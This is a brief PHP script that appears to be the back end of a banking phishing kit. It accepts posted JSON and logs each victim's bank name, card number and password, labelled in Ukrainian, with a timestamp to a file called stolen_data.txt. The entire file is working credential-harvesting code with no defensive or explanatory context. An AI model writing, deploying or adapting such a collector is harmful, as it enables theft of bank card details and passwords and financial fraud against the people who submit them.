<?php
$data = json_decode(file_get_contents("php://input"), true);

if ($data) {
    $entry = date("Y-m-d H:i:s") . " | Банк: " . $data["bank"] . " | Картка: " . $data["cardNumber"] . " | Пароль: " . $data["password"] . "\n";
    file_put_contents("stolen_data.txt", $entry, FILE_APPEND);
}
?>
